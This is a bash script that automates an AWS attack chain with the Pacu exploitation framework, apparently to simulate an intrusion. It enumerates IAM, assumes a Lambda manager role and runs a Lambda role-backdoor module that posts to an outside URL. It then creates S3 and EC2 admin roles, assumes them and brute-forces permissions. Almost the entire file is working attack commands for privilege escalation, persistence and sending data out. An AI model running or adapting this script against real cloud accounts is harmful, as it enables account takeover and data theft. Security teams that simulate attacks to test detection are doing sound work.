export AWS_PAGER=""
export AWS_REGION='us-east-1'

. ./lambda_hijacking.config

export AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$AWS_SECRET_KEY
export AWS_SESSION_TOKEN=''

if [[ $(../pacu/cli.py --session backdoor_roles) == *"Session could not be found"* ]]; then
   ../pacu/cli.py --new-session backdoor_roles
fi

sleep 5
echo 'pacu: --activate-session'
../pacu/cli.py --activate-session --session backdoor_roles

echo 'pacu: --set-keys'
../pacu/cli.py --session backdoor_roles --set-keys backdoor,$AWS_ACCESS_KEY_ID,$AWS_SECRET_ACCESS_KEY,'c'

echo 'pacu : --module-name aws__enum_account'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
../pacu/cli.py --session backdoor_roles --exec --module-name aws__enum_account

echo 'pacu : --module-name iam__enum_permissions'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
../pacu/cli.py --session backdoor_roles --exec --module-name iam__enum_permissions

echo 'pacu : --module-name iam__enum_users_roles_policies_groups'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
../pacu/cli.py --session backdoor_roles --exec --module-name iam__enum_users_roles_policies_groups 

echo 'pacu : --whoami'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
../pacu/cli.py --session backdoor_roles --whoami

echo 'aws : assume-role lambdaManager-role'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
sts_session=$(aws sts assume-role --role-arn arn:aws:iam::$AWS_ACCOUNT:role/lambdaManager-role --role-session-name lambdaManager)
export AWS_ACCESS_KEY_ID=$(echo $sts_session | jq -r '.Credentials''.AccessKeyId')
export AWS_SESSION_TOKEN=$(echo $sts_session | jq -r '.Credentials''.SessionToken')
export AWS_SECRET_ACCESS_KEY=$(echo $sts_session | jq -r '.Credentials''.SecretAccessKey')

echo 'pacu: --set-keys'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
../pacu/cli.py --session backdoor_roles --set-keys backdoor,$AWS_ACCESS_KEY_ID,$AWS_SECRET_ACCESS_KEY,$AWS_SESSION_TOKEN

echo 'pacu: --iam__enum_permissions'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
../pacu/cli.py --session backdoor_roles --exec --module-name iam__enum_permissions

echo 'pacu : --module-name iam__enum_users_roles_policies_groups'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
../pacu/cli.py --session backdoor_roles --exec --module-name iam__enum_users_roles_policies_groups

echo 'pacu: --whoami'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
../pacu/cli.py --session backdoor_roles --whoami

echo 'pacu: lambda__enum'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
../pacu/cli.py --session backdoor_roles --exec --module-name lambda__enum --module-args='--regions us-east-1,us-west-2'

echo 'pacu: lambda__backdoor_new_roles'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
../pacu/cli.py --session backdoor_roles --exec --module-name lambda__backdoor_new_roles --module-args='--exfil-url https://commander-api.vectratme.com/adduser --role-arn arn:aws:iam::'"$AWS_ACCOUNT"':role/admin-lambda-service-role --arn arn:aws:iam::'"$AWS_ACCOUNT"':user/'$USERNAME


aws iam create-role --role-name S3Admin --assume-role-policy-document file://assume_trust_policy.json --profile $ADMIN_PROFILE
aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess --role-name S3Admin  --profile $ADMIN_PROFILE

aws iam create-role --role-name EC2Admin --assume-role-policy-document file://assume_trust_policy.json  --profile $ADMIN_PROFILE
aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AmazonEC2FullAccess --role-name EC2Admin  --profile $ADMIN_PROFILE

export AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$AWS_SECRET_KEY
export AWS_SESSION_TOKEN=''

echo 'aws : assume-role s3admin'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
sts_session=$(aws sts assume-role --role-arn arn:aws:iam::$AWS_ACCOUNT:role/S3Admin --role-session-name s3admin)
sleep 5
export AWS_ACCESS_KEY_ID=$(echo $sts_session | jq -r '.Credentials''.AccessKeyId')
export AWS_SESSION_TOKEN=$(echo $sts_session | jq -r '.Credentials''.SessionToken')
export AWS_SECRET_ACCESS_KEY=$(echo $sts_session | jq -r '.Credentials''.SecretAccessKey')

echo 'bruteforce s3'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
../pacu/cli.py --session backdoor_roles --set-keys backdoor,$AWS_ACCESS_KEY_ID,$AWS_SECRET_ACCESS_KEY,$AWS_SESSION_TOKEN
../pacu/cli.py --session backdoor_roles --exec --module-name iam__bruteforce_permissions --module-args='--services s3'

aws s3api list-buckets

export AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$AWS_SECRET_KEY
export AWS_SESSION_TOKEN=''

echo 'aws : assume-role EC2Admin'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
sts_session=$(aws sts assume-role --role-arn arn:aws:iam::$AWS_ACCOUNT:role/EC2Admin --role-session-name ec2admin)
sleep 5
export AWS_ACCESS_KEY_ID=$(echo $sts_session | jq -r '.Credentials''.AccessKeyId')
export AWS_SESSION_TOKEN=$(echo $sts_session | jq -r '.Credentials''.SessionToken')
export AWS_SECRET_ACCESS_KEY=$(echo $sts_session | jq -r '.Credentials''.SecretAccessKey')

echo 'bruteforce ec2'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer

../pacu/cli.py --session backdoor_roles --set-keys backdoor,$AWS_ACCESS_KEY_ID,$AWS_SECRET_ACCESS_KEY,$AWS_SESSION_TOKEN
../pacu/cli.py --session backdoor_roles --exec --module-name iam__bruteforce_permissions --module-args='--services ec2'

echo 'ec2__enum'
timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer

../pacu/cli.py --session backdoor_roles --exec --module-name ec2__enum --module-args='--regions us-east-1,us-west-2' 
echo 'DONE!'

 



